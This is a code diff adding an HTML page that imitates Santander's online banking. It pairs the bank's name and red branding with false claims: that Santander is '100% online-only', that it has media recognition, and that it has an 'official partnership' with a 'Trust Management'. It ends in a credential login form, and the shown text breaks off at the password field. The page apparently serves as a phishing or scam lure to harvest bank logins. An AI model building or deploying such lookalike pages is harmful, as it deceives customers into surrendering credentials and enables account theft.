@@ -1,0 +1,850 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Santander · Trusted Online Banking</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:opsz,wght@8..60,400;8..60,600;8..60,700&family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    /* ----- reset & base ----- */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f8f9fc;
+      color: #1a1a1a;
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    .serif { font-family: 'Source Serif 4', serif; }
+    .mono { font-family: 'JetBrains Mono', monospace; font-variant-numeric: tabular-nums; }
+    a { color: inherit; text-decoration: none; }
+    button { font-family: inherit; cursor: pointer; }
+    .container { max-width: 1280px; margin: 0 auto; padding: 0 24px; width: 100%; }
+
+    /* ----- TOP ANNOUNCEMENT BANNER ----- */
+    .announcement-banner {
+      background: linear-gradient(90deg, #ec0000, #b30000, #ec0000);
+      background-size: 200% 100%;
+      animation: shimmer 6s linear infinite;
+      color: #fff;
+      text-align: center;
+      padding: 10px 16px;
+      font-size: 12px;
+      font-weight: 700;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      position: relative;
+      z-index: 101;
+    }
+    .announcement-banner i { font-size: 14px; }
+    @keyframes shimmer {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 200% 50%; }
+    }
+
+    /* ----- header ----- */
+    .main-header {
+      background: #fff;
+      position: sticky; top: 0; z-index: 100;
+      border-bottom: 1px solid #eaeaea;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.02);
+    }
+    .header-inner {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 16px 0; gap: 12px;
+    }
+    .logo-area { display: flex; align-items: center; gap: 12px; }
+    .logo-mark {
+      width: 40px; height: 40px; background: #ec0000;
+      border-radius: 12px; display: flex; align-items: center; justify-content: center;
+      font-weight: 800; font-size: 18px; color: #fff;
+      box-shadow: 0 4px 12px rgba(236, 0, 0, 0.2);
+    }
+    .brand-name { font-family: 'Source Serif 4', serif; font-weight: 700; font-size: 20px; letter-spacing: -0.3px; color: #111; }
+    .brand-tag { font-size: 9px; letter-spacing: 2.5px; color: #777; font-weight: 600; display: block; margin-top: 1px; }
+
+    .header-right { display: flex; align-items: center; gap: 12px; position: relative; }
+    
+    .menu-btn {
+      width: 44px; height: 44px; border-radius: 12px;
+      background: #f4f6f9; border: 1px solid #eaeaea;
+      display: flex; align-items: center; justify-content: center;
+      color: #333; font-size: 18px; transition: all 0.25s;
+    }
+    .menu-btn:hover { background: #fff; border-color: #ec0000; color: #ec0000; }
+
+    /* Dropdown */
+    .nav-dropdown {
+      position: absolute; top: calc(100% + 12px); right: 0;
+      background: #fff; border: 1px solid #eaeaea;
+      border-radius: 16px; padding: 12px; min-width: 240px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.08);
+      opacity: 0; visibility: hidden; transform: translateY(-8px);
+      transition: all 0.25s ease; z-index: 200;
+    }
+    .nav-dropdown.open { opacity: 1; visibility: visible; transform: translateY(0); }
+    .nav-dropdown a {
+      display: flex; align-items: center; gap: 12px;
+      padding: 12px 14px; border-radius: 10px;
+      font-size: 14px; font-weight: 500; color: #333;
+      transition: all 0.2s;
+    }
+    .nav-dropdown a i { width: 18px; font-size: 14px; color: #888; transition: color 0.2s; }
+    .nav-dropdown a:hover { background: #fce8e8; color: #ec0000; }
+    .nav-dropdown a:hover i { color: #ec0000; }
+    .nav-divider { height: 1px; background: #eaeaea; margin: 8px 0; }
+
+    .btn-outline {
+      background: transparent; border: 1.5px solid #ddd;
+      color: #333; padding: 10px 24px; border-radius: 40px;
+      font-weight: 600; font-size: 14px; transition: all 0.25s;
+      display: inline-flex; align-items: center; gap: 8px;
+    }
+    .btn-outline:hover { border-color: #ec0000; color: #ec0000; }
+
+    .btn-primary {
+      background: #ec0000;
+      color: #fff; border: none; padding: 12px 28px; border-radius: 40px;
+      font-weight: 700; font-size: 14px; transition: all 0.25s ease;
+      box-shadow: 0 4px 12px rgba(236, 0, 0, 0.2);
+      display: inline-flex; align-items: center; gap: 8px;
+    }
+    .btn-primary:hover { background: #c90000; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(236, 0, 0, 0.3); }
+
+    /* ----- hero ----- */
+    .hero { padding: 80px 0 100px; position: relative; background: #fff; }
+    .hero .container { display: grid; grid-template-columns: 1.1fr 0.9fr; align-items: center; gap: 60px; }
+    
+    .hero-badge {
+      background: #fce8e8; color: #ec0000;
+      font-weight: 700; font-size: 11px; padding: 8px 16px; border-radius: 30px;
+      display: inline-flex; align-items: center; gap: 8px; margin-bottom: 28px;
+      letter-spacing: 1px; text-transform: uppercase;
+    }
+    .hero-badge i { font-size: 10px; }
+    
+    .hero h1 {
+      font-size: 60px; font-weight: 700;
+      color: #111; line-height: 1.05; letter-spacing: -2px; margin-bottom: 24px;
+    }
+    .hero h1 span { color: #ec0000; }
+    .hero p { font-size: 18px; color: #555; margin-bottom: 40px; max-width: 520px; line-height: 1.6; }
+    
+    .hero-buttons { display: flex; gap: 16px; flex-wrap: wrap; align-items: center; margin-bottom: 48px; }
+
+    /* Professional Trust Row */
+    .trust-row { display: flex; align-items: center; gap: 32px; border-top: 1px solid #eaeaea; padding-top: 32px; flex-wrap: wrap; }
+    .trust-label { font-size: 11px; font-weight: 700; color: #999; text-transform: uppercase; letter-spacing: 1px; }
+    .trust-logos { display: flex; gap: 24px; align-items: center; flex-wrap: wrap; }
+    .trust-logos span { font-family: 'Source Serif 4', serif; font-weight: 700; font-size: 16px; color: #ccc; letter-spacing: -0.5px; transition: color 0.3s; }
+    .trust-logos span:hover { color: #ec0000; }
+
+    /* Red Credit Card Mockup */
+    .hero-visual { display: flex; justify-content: center; position: relative; perspective: 1000px; }
+    .card-glow {
+      position: absolute; inset: -40px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(236, 0, 0, 0.1), transparent 60%);
+      filter: blur(40px); z-index: -1;
+    }
+    .credit-card {
+      width: 100%; max-width: 400px; height: 240px;
+      background: linear-gradient(135deg, #ec0000, #a30000);
+      border-radius: 24px; padding: 28px;
+      border: 1px solid rgba(255,255,255,0.15);
+      box-shadow: 0 24px 60px rgba(236,0,0,0.3);
+      position: relative; overflow: hidden;
+      transition: transform 0.5s ease;
+      display: flex; flex-direction: column; justify-content: space-between;
+    }
+    .credit-card:hover { transform: translateY(-10px) rotateX(5deg) rotateY(-5deg); }
+    .credit-card::before {
+      content: ''; position: absolute; top: 0; right: 0; width: 150px; height: 150px;
+      background: radial-gradient(circle, rgba(255,255,255,0.2), transparent 70%);
+      border-radius: 50%;
+    }
+    .card-top { display: flex; justify-content: space-between; align-items: flex-start; position: relative; z-index: 1; }
+    .card-logo { font-family: 'Source Serif 4', serif; font-weight: 700; font-size: 20px; color: #fff; letter-spacing: -0.5px; }
+    .card-chip-icon { width: 40px; height: 30px; background: linear-gradient(135deg, #f0d080, #b89040); border-radius: 6px; position: relative; }
+    .card-chip-icon::after { content: ''; position: absolute; inset: 4px; border: 1px solid rgba(0,0,0,0.2); border-radius: 3px; }
+    .card-middle { position: relative; z-index: 1; }
+    .card-number { font-family: 'JetBrains Mono', monospace; font-size: 22px; letter-spacing: 2px; color: #fff; margin-bottom: 16px; }
+    .card-bottom { display: flex; justify-content: space-between; align-items: flex-end; position: relative; z-index: 1; }
+    .card-holder { font-size: 11px; color: rgba(255,255,255,0.7); text-transform: uppercase; letter-spacing: 1px; }
+    .card-holder span { display: block; font-family: 'Inter', sans-serif; font-size: 14px; color: #fff; font-weight: 600; margin-top: 4px; letter-spacing: 0.5px; }
+    .card-expiry { text-align: right; font-size: 11px; color: rgba(255,255,255,0.7); text-transform: uppercase; letter-spacing: 1px; }
+    .card-expiry span { display: block; font-family: 'Inter', sans-serif; font-size: 14px; color: #fff; font-weight: 600; margin-top: 4px; letter-spacing: 0.5px; }
+
+    /* ----- services ----- */
+    .services { padding: 100px 0; background: #f8f9fc; position: relative; border-top: 1px solid #eaeaea; }
+    .section-header { text-align: center; max-width: 700px; margin: 0 auto 64px; }
+    .section-eyebrow { font-size: 12px; color: #ec0000; font-weight: 700; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 12px; }
+    .section-title { font-size: 44px; font-weight: 700; margin-bottom: 16px; color: #111; letter-spacing: -1px; line-height: 1.15; }
+    .section-title span { color: #ec0000; }
+    .section-sub { font-size: 16px; color: #555; line-height: 1.6; }
+
+    .services-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; }
+    .service-card {
+      background: #fff; border-radius: 20px; padding: 32px 28px; 
+      border: 1px solid #eaeaea; box-shadow: 0 4px 12px rgba(0,0,0,0.02);
+      transition: all 0.35s ease; position: relative; overflow: hidden;
+    }
+    .service-card::before {
+      content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+      background: #ec0000;
+      opacity: 0; transition: opacity 0.35s;
+    }
+    .service-card:hover { transform: translateY(-6px); box-shadow: 0 12px 30px rgba(0,0,0,0.06); border-color: #ec0000; }
+    .service-card:hover::before { opacity: 1; }
+    .service-icon {
+      background: #fce8e8; width: 52px; height: 52px; border-radius: 14px;
+      display: flex; align-items: center; justify-content: center; margin-bottom: 24px;
+      font-size: 22px; color: #ec0000;
+    }
+    .service-card h3 { font-size: 17px; font-weight: 700; margin-bottom: 10px; color: #111; }
+    .service-card p { font-size: 14px; color: #666; line-height: 1.6; }
+
+    /* ----- why choose us ----- */
+    .why-us { padding: 100px 0; background: #fff; }
+    .why-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 32px; margin-top: 56px; }
+    .why-card { 
+      background: #fff; border: 1px solid #eaeaea; border-radius: 20px; padding: 40px 32px;
+      transition: all 0.35s ease; text-align: left;
+    }
+    .why-card:hover { border-color: #ec0000; box-shadow: 0 12px 30px rgba(0,0,0,0.04); transform: translateY(-4px); }
+    .why-icon {
+      width: 56px; height: 56px; background: #fce8e8; border-radius: 14px;
+      display: flex; align-items: center; justify-content: center; margin-bottom: 24px;
+      font-size: 24px; color: #ec0000;
+    }
+    .why-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 12px; color: #111; }
+    .why-card p { font-size: 14px; color: #666; line-height: 1.6; }
+
+    /* ----- how it works ----- */
+    .how-it-works { padding: 100px 0; background: #f8f9fc; border-top: 1px solid #eaeaea; }
+    .steps-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; margin-top: 56px; }
+    .step-card {
+      background: #fff; border-radius: 20px; padding: 48px 32px 40px;
+      border: 1px solid #eaeaea; position: relative; overflow: hidden;
+      transition: all 0.35s ease;
+    }
+    .step-card:hover { transform: translateY(-4px); box-shadow: 0 12px 30px rgba(0,0,0,0.04); border-color: #ec0000; }
+    .step-card::before {
+      content: ''; position: absolute; top: 0; left: 0; width: 100%; height: 3px;
+      background: #ec0000; opacity: 0; transition: opacity 0.35s;
+    }
+    .step-card:hover::before { opacity: 1; }
+    .step-num {
+      font-family: 'Source Serif 4', serif; font-size: 56px; font-weight: 700;
+      color: #fce8e8; position: absolute; top: 24px; right: 32px; line-height: 1;
+      transition: color 0.35s;
+    }
+    .step-card:hover .step-num { color: #f8d0d0; }
+    .step-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 12px; color: #111; margin-top: 24px; position: relative; z-index: 1; }
+    .step-card p { font-size: 14px; color: #666; line-height: 1.6; position: relative; z-index: 1; }
+
+    /* ----- PARTNERSHIP BANNER ----- */
+    .partnership-banner {
+      padding: 80px 0; 
+      background: #050505;
+      position: relative; overflow: hidden;
+      border-top: 4px solid #ec0000;
+      border-bottom: 4px solid #ec0000;
+    }
+    .partnership-banner::before {
+      content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      width: 100%; max-width: 800px; height: 400px;
+      background: radial-gradient(ellipse, rgba(236, 0, 0, 0.25), transparent 70%);
+      filter: blur(80px); pointer-events: none;
+      animation: pulseGlow 4s ease-in-out infinite;
+    }
+    @keyframes pulseGlow {
+      0%, 100% { opacity: 0.5; transform: translate(-50%, -50%) scale(1); }
+      50% { opacity: 1; transform: translate(-50%, -50%) scale(1.1); }
+    }
+    .partnership-inner { 
+      position: relative; z-index: 1; 
+      max-width: 1000px; margin: 0 auto; 
+      display: flex; flex-direction: column; align-items: center; gap: 48px;
+      padding: 0 24px;
+      text-align: center;
+    }
+    
+    .partnership-tag {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: rgba(236, 0, 0, 0.15); color: #ff4444;
+      font-weight: 800; font-size: 13px; letter-spacing: 3px;
+      padding: 10px 24px; border-radius: 40px; margin-bottom: 24px;
+      text-transform: uppercase; border: 1px solid rgba(236, 0, 0, 0.4);
+      box-shadow: 0 0 20px rgba(236, 0, 0, 0.2);
+      animation: pulseText 2s infinite;
+    }
+    @keyframes pulseText {
+      0%, 100% { box-shadow: 0 0 20px rgba(236, 0, 0, 0.2); }
+      50% { box-shadow: 0 0 30px rgba(236, 0, 0, 0.5); }
+    }
+    .partnership-tag i { font-size: 12px; }
+    
+    .partnership-content h2 { font-size: 52px; font-weight: 700; line-height: 1.1; margin-bottom: 24px; color: #fff; letter-spacing: -1.5px; }
+    .partnership-content h2 span { 
+      background: linear-gradient(135deg, #ec0000, #ff5555);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+    }
+    .partnership-content p { font-size: 18px; color: #999; line-height: 1.6; max-width: 600px; margin: 0 auto; }
+    
+    .partnership-logos {
+      display: flex; align-items: center; justify-content: center; gap: 32px;
+      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08);
+      padding: 24px 48px; border-radius: 24px;
+      margin-top: 16px;
+    }
+    .partner-logo {
+      display: flex; align-items: center; gap: 12px;
+      font-family: 'Source Serif 4', serif; font-size: 28px; font-weight: 700; color: #fff;
+    }
+    .partner-logo i { color: #ec0000; font-size: 32px; }
+    .partner-logo.tm { font-family: 'Inter', sans-serif; font-size: 24px; font-weight: 800; color: #fff; }
+    .partner-logo.tm i { color: #fff; }
+    .partner-plus { color: #555; font-size: 24px; }
+
+    /* ----- LOGIN ----- */
+    .login-section { padding: 100px 0; background: #f8f9fc; position: relative; overflow: hidden; }
+    .login-section::before {
+      content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+      width: 800px; height: 800px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(236, 0, 0, 0.04), transparent 60%);
+      pointer-events: none;
+    }
+
+    .login-wrapper {
+      max-width: 440px; margin: 0 auto; background: #fff;
+      border-radius: 24px; padding: 48px 40px;
+      border: 1px solid #eaeaea; box-shadow: 0 20px 60px rgba(0,0,0,0.06);
+      position: relative; z-index: 1;
+    }
+    .login-secure-badge {
+      position: absolute; top: -14px; left: 50%; transform: translateX(-50%);
+      background: #111; color: #fff; padding: 6px 18px; border-radius: 40px;
+      font-size: 11px; font-weight: 700; letter-spacing: 1px; text-transform: uppercase;
+      display: inline-flex; align-items: center; gap: 6px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15); white-space: nowrap;
+    }
+    .login-wrapper h2 { font-family: 'Source Serif 4', serif; font-size: 32px; font-weight: 700; color: #111; margin-bottom: 8px; text-align: center; letter-spacing: -0.5px; }
+    .login-wrapper h2 span { color: #ec0000; }
+    .login-subtext { font-size: 14px; color: #666; text-align: center; margin-bottom: 36px; line-height: 1.5; }
+    
+    .form-group { margin-bottom: 20px; }
+    .login-form label { display: block; font-size: 11px; font-weight: 600; color: #444; text-transform: uppercase; letter-spacing: 0.8px; margin-bottom: 8px; }
+    .input-wrap { position: relative; }
+    .input-wrap i.left-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: #999; font-size: 14px; transition: color 0.25s; }
+    .input-wrap i.eye { position: absolute; right: 16px; top: 50%; transform: translateY(-50%); color: #999; font-size: 14px; cursor: pointer; transition: color 0.25s; }
+    .input-wrap i.eye:hover { color: #ec0000; }
+    .login-form input {
+      width: 100%; padding: 14px 44px; border: 1.5px solid #eaeaea; border-radius: 12px;
+      font-size: 14px; font-family: inherit; background: #fafafa; color: #111; outline: none; transition: all 0.25s;
+    }
+    .login-form input:focus { border-color: #ec0000; background: #fff; box-shadow: 0 0 0 4px rgba(236, 0, 0, 0.08); }
+    .login-form input:focus ~ i.left-icon, .input-wrap:focus-within i.left-icon { color: #ec0000; }
+    
+    .login-form button {
+      width: 100%; padding: 16px; background: #ec0000; color: white; border: none; border-radius: 12px;
+      font-size: 15px; font-weight: 700; transition: all 0.25s; margin-top: 8px;
+      box-shadow: 0 6px 20px rgba(236, 0, 0, 0.25); display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .login-form button:hover { background: #c90000; transform: translateY(-2px); box-shadow: 0 10px 30px rgba(236, 0, 0, 0.35); }
+    .login-form button:disabled { opacity: 0.7; cursor: not-allowed; transform: none; }
+    
+    .login-message { margin-top: 20px; padding: 14px 16px; border-radius: 12px; font-size: 13px; font-weight: 500; display: none; text-align: center; }
+    .login-message.success { display: block; background: #e6f7ec; color: #1b8a4c; border: 1px solid #b3e6c9; }
+    .login-message.error { display: block; background: #fce8e8; color: #ec0000; border: 1px solid #fcc; }
+    
+    .login-footer { margin-top: 24px; text-align: center; font-size: 13px; color: #888; }
+    .login-footer a { color: #ec0000; font-weight: 600; }
+    .login-footer a:hover { text-decoration: underline; }
+
+    /* ----- animated security marquee ----- */
+    .security { padding: 40px 0; border-top: 1px solid #eaeaea; background: #fff; overflow: hidden; }
+    .marquee-track {
+      display: flex; gap: 48px; width: max-content;
+      animation: scrollMarquee 25s linear infinite;
+    }
+    .marquee-track:hover { animation-play-state: paused; }
+    .security-item { display: flex; align-items: center; gap: 14px; font-size: 14px; color: #444; font-weight: 500; white-space: nowrap; }
+    .security-item i { font-size: 18px; color: #ec0000; }
+    
+    @keyframes scrollMarquee {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-50%); }
+    }
+
+    /* ----- SIMPLE CREDIBILITY FOOTER ----- */
+    .footer { background: #0f1a2f; color: #a0b0c8; padding: 60px 0 32px; font-size: 14px; }
+    
+    .footer-credentials {
+      display: flex; justify-content: center; align-items: center; gap: 48px; flex-wrap: wrap;
+      padding-bottom: 40px; border-bottom: 1px solid rgba(255,255,255,0.08); margin-bottom: 40px;
+    }
+    .credential-item { display: flex; align-items: center; gap: 12px; }
+    .credential-item i {
+      font-size: 20px; color: #ec0000;
+      background: rgba(236,0,0,0.1); padding: 10px; border-radius: 50%;
+      width: 44px; height: 44px; display: flex; align-items: center; justify-content: center;
+    }
+    .credential-item div span { display: block; }
+    .credential-item .c-title { font-size: 12px; font-weight: 700; color: #fff; text-transform: uppercase; letter-spacing: 1px; }
+    .credential-item .c-sub { font-size: 11px; color: #7a8aa8; }
+
+    .footer-middle {
+      display: flex; flex-direction: column; align-items: center; text-align: center;
+      gap: 16px; max-width: 600px; margin: 0 auto 40px;
+    }
+    .footer-middle .footer-logo { display: flex; align-items: center; gap: 12px; justify-content: center; }
+    .footer-middle .footer-logo .logo-mark { width: 36px; height: 36px; font-size: 16px; box-shadow: none; }
+    .footer-middle .footer-logo .brand-name { color: #fff; font-size: 20px; }
+    .footer-middle .footer-logo .brand-tag { color: #7a8aa8; }
+    .footer-middle p { font-size: 14px; color: #7a8aa8; line-height: 1.6; }
+    .footer-email {
+      display: inline-flex; align-items: center; gap: 10px; font-size: 14px;
+      background: rgba(255,255,255,0.03); padding: 12px 24px; border-radius: 60px;
+      border: 1px solid rgba(255,255,255,0.08); transition: all 0.25s; margin-top: 8px;
+    }
+    .footer-email:hover { border-color: #ec0000; background: rgba(236,0,0,0.05); }
+    .footer-email i { color: #ec0000; font-size: 16px; }
+    .footer-email a { color: #fff; font-weight: 500; }
+    
+    .footer-bottom {
+      text-align: center; font-size: 12px; color: #5a6a8a; line-height: 1.8;
+      border-top: 1px solid rgba(255,255,255,0.08); padding-top: 24px; max-width: 900px; margin: 0 auto;
+    }
+    .footer-bottom strong { color: #a0b0c8; font-weight: 600; }
+
+    /* ----- responsive ----- */
+    @media (max-width: 1024px) {
+      .hero { padding: 60px 0 80px; }
+      .hero .container { grid-template-columns: 1fr; gap: 48px; text-align: center; }
+      .hero h1 { font-size: 48px; }
+      .hero p { margin: 0 auto 40px; }
+      .hero-buttons { justify-content: center; }
+      .trust-row { justify-content: center; border-top: none; padding-top: 0; }
+      .hero-visual { order: -1; }
+      .credit-card { max-width: 360px; height: 220px; }
+      
+      .services-grid { grid-template-columns: repeat(2, 1fr); }
+      .why-grid { grid-template-columns: 1fr; gap: 24px; }
+      .steps-grid { grid-template-columns: 1fr; gap: 24px; }
+      .section-title { font-size: 36px; }
+      
+      .partnership-content h2 { font-size: 42px; }
+      .partnership-logos { flex-direction: column; padding: 24px; gap: 24px; }
+      .partner-plus { transform: rotate(90deg); }
+      
+      .footer-credentials { gap: 32px; }
+    }
+    @media (max-width: 768px) {
+      .hero h1 { font-size: 36px; letter-spacing: -1px; }
+      .hero p { font-size: 16px; }
+      .section-title { font-size: 30px; }
+      .login-wrapper { padding: 40px 32px; }
+      
+      .partnership-content h2 { font-size: 32px; }
+      .partner-logo { font-size: 22px; }
+      .partner-logo.tm { font-size: 20px; }
+    }
+    @media (max-width: 480px) {
+      .container { padding: 0 16px; }
+      .brand-name { font-size: 18px; }
+      .btn-outline { padding: 9px 18px; font-size: 13px; }
+      .hero h1 { font-size: 30px; }
+      .services-grid { grid-template-columns: 1fr; }
+      .nav-dropdown { right: -12px; min-width: 220px; }
+      .credit-card { max-width: 100%; height: 200px; padding: 20px; }
+      .card-number { font-size: 16px; }
+      .card-logo { font-size: 16px; }
+      
+      .partnership-banner { padding: 60px 0; }
+      .partnership-content h2 { font-size: 28px; }
+      .partnership-content p { font-size: 14px; }
+      .partner-logo { font-size: 18px; }
+      .partner-logo i { font-size: 24px; }
+      .partner-logo.tm { font-size: 16px; }
+      
+      .login-wrapper { padding: 32px 24px; }
+      .login-wrapper h2 { font-size: 28px; }
+      
+      .footer-credentials { flex-direction: column; align-items: flex-start; gap: 20px; }
+      .footer-email { font-size: 13px; padding: 10px 18px; }
+      
+      .announcement-banner { font-size: 10px; padding: 8px 12px; letter-spacing: 1px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- TOP ANNOUNCEMENT BANNER -->
+  <div class="announcement-banner">
+    <i class="fas fa-globe"></i> Santander is a 100% Online-Only Bank
+  </div>
+
+  <!-- Main header -->
+  <header class="main-header">
+    <div class="container">
+      <div class="header-inner">
+        <div class="logo-area">
+          <div class="logo-mark">S</div>
+          <div>
+            <div class="brand-name">Santander</div>
+            <span class="brand-tag">TRUSTED ONLINE BANKING</span>
+          </div>
+        </div>
+        <div class="header-right">
+          <button class="menu-btn" id="menuBtn" aria-label="Open menu">
+            <i class="fas fa-bars"></i>
+          </button>
+          <div class="nav-dropdown" id="navDropdown">
+            <a href="#services"><i class="fas fa-wallet"></i> Accounts</a>
+            <a href="#services"><i class="fas fa-credit-card"></i> Cards</a>
+            <a href="#services"><i class="fas fa-mobile-alt"></i> Payments</a>
+            <a href="#services"><i class="fas fa-piggy-bank"></i> Savings</a>
+            <div class="nav-divider"></div>
+            <a href="#help"><i class="fas fa-headset"></i> Support</a>
+            <a href="#login"><i class="fas fa-sign-in-alt"></i> Log in</a>
+          </div>
+          <a href="#login" class="btn-outline">Log in</a>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- Hero section -->
+  <section class="hero" id="hero">
+    <div class="container">
+      <div class="hero-content">
+        <div class="hero-badge"><i class="fas fa-shield-alt"></i> Bank with confidence</div>
+        <h1 class="serif">Banking that <br><span>moves</span> with you.</h1>
+        <p>Experience the security of a global institution with the ease of a modern digital bank. Manage accounts, transfer funds, and grow your wealth seamlessly.</p>
+        <div class="hero-buttons">
+          <a href="#login" class="btn-primary">Open an account <i class="fas fa-arrow-right"></i></a>
+          <a href="#services" class="btn-outline">Explore services</a>
+        </div>
+        
+        <div class="trust-row">
+          <span class="trust-label">Recognized By</span>
+          <div class="trust-logos">
+            <span>Forbes</span>
+            <span>Bloomberg</span>
+            <span>The Times</span>
+            <span>Reuters</span>
+          </div>
+        </div>
+      </div>
+      
+      <div class="hero-visual">
+        <div class="card-glow"></div>
+        <div class="credit-card">
+          <div class="card-top">
+            <div class="card-logo">Santander</div>
+            <div class="card-chip-icon"></div>
+          </div>
+          <div class="card-middle">
+            <div class="card-number">•••• •••• •••• 4782</div>
+          </div>
+          <div class="card-bottom">
+            <div class="card-holder">Member Status <span>Platinum Premier</span></div>
+            <div class="card-expiry">Valid Thru <span>12 / 28</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Services -->
+  <section class="services" id="services">
+    <div class="container">
+      <div class="section-header">
+        <div class="section-eyebrow">Our Services</div>
+        <h2 class="section-title serif">Everything you need, <span>in one place.</span></h2>
+        <p class="section-sub">From everyday spending to long-term wealth — designed to give you complete control of your financial life.</p>
+      </div>
+      <div class="services-grid">
+        <div class="service-card">
+          <div class="service-icon"><i class="fas fa-wallet"></i></div>
+          <h3>Current Accounts</h3>
+          <p>Fee-free everyday banking with instant notifications and total transparency.</p>
+        </div>
+        <div class="service-card">
+          <div class="service-icon"><i class="fas fa-credit-card"></i></div>
+          <h3>Credit & Debit Cards</h3>
+          <p>Flexible limits, cashback rewards, and premium travel benefits.</p>
+        </div>
+        <div class="service-card">
+          <div class="service-icon"><i class="fas fa-mobile-alt"></i></div>
+          <h3>Mobile Payments</h3>
+          <p>Send, request, and split bills instantly — right from your phone.</p>
+        </div>
+        <div class="service-card">
+          <div class="service-icon"><i class="fas fa-piggy-bank"></i></div>
+          <h3>Savings & Investments</h3>
+          <p>Set goals, build wealth, and grow your money automatically.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Why Choose Us -->
+  <section class="why-us" id="why-us">
+    <div class="container">
+      <div class="section-header">
+        <div class="section-eyebrow">Why Santander</div>
+        <h2 class="section-title serif">Built for modern <span>banking.</span></h2>
+        <p class="section-sub">We combine decades of trust with cutting-edge technology.</p>
+      </div>
+      <div class="why-grid">
+        <div class="why-card">
+          <div class="why-icon"><i class="fas fa-award"></i></div>
+          <h3>Award-Winning Support</h3>
+          <p>Our dedicated team is available 24/7 to help you with anything you need, whenever you need it.</p>
+        </div>
+        <div class="why-card">
+          <div class="why-icon"><i class="fas fa-globe"></i></div>
+          <h3>Global Access</h3>
+          <p>Access your money and manage your accounts from anywhere in the world with zero foreign transaction fees.</p>
+        </div>
+        <div class="why-card">
+          <div class="why-icon"><i class="fas fa-shield-alt"></i></div>
+          <h3>Smart Security</h3>
+          <p>Advanced biometric authentication, real-time fraud alerts, and the ability to freeze your card instantly.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- How It Works -->
+  <section class="how-it-works" id="how-it-works">
+    <div class="container">
+      <div class="section-header">
+        <div class="section-eyebrow">How It Works</div>
+        <h2 class="section-title serif">Get started in <span>minutes.</span></h2>
+        <p class="section-sub">Opening an account with Santander is quick, secure, and completely digital.</p>
+      </div>
+      <div class="steps-grid">
+        <div class="step-card">
+          <div class="step-num">01</div>
+          <h3>Apply Online</h3>
+          <p>Fill out a quick application form. It takes less than 5 minutes and requires no paperwork.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-num">02</div>
+          <h3>Verify Identity</h3>
+          <p>Verify your identity using a photo of your ID and a quick selfie. All done securely from your phone.</p>
+        </div>
+        <div class="step-card">
+          <div class="step-num">03</div>
+          <h3>Start Banking</h3>
+          <p>Once approved, your digital card is instantly available. Start transferring, saving, and spending right away.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- PARTNERSHIP BANNER -->
+  <section class="partnership-banner" id="partnership">
+    <div class="container">
+      <div class="partnership-inner">
+        <div class="partnership-tag"><i class="fas fa-handshake"></i> Official Partnership</div>
+        
+        <div class="partnership-content">
+          <h2 class="serif">We are proud to partner with <span>Trust Management.</span></h2>
+          <p>Santander Online Bank has joined forces with Trust Management to bring you exclusive financial tools, premium support, and smarter ways to manage your money — all in one secure place.</p>
+        </div>
+        
+        <div class="partnership-logos">
+          <div class="partner-logo">
+            <i class="fas fa-university"></i> Santander
+          </div>
+          <div class="partner-plus"><i class="fas fa-plus"></i></div>
+          <div class="partner-logo tm">
+            <i class="fas fa-handshake"></i> Trust Management
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- LOGIN -->
+  <section class="login-section" id="login">
+    <div class="container">
+      <div class="login-wrapper">
+        <div class="login-secure-badge">
+          <i class="fas fa-lock"></i> Secure Login
+        </div>
+
+        <h2 class="serif">Welcome <span>back.</span></h2>
+        <p class="login-subtext">Enter your credentials to access your Santander Dashboard.</p>
+
+        <form class="login-form" id="loginForm">
+          <div class="form-group">
+            <label for="username">Username</label>
+            <div class="input-wrap">
+              <input type="text" id="username" name="username" placeholder="Enter your username" autocomplete="username">
+              <i class="fas fa-user left-icon"></i>
+            </div>
+          </div>
+          <div class="form-group">
+            <label for="password">Password</label>
+            <div class="input-wrap">
+              <input type="password" id="password" name="password" placeholder="Enter your password" autocomplete="current-password">
+              <i class="fas fa-lock left-icon"></i>
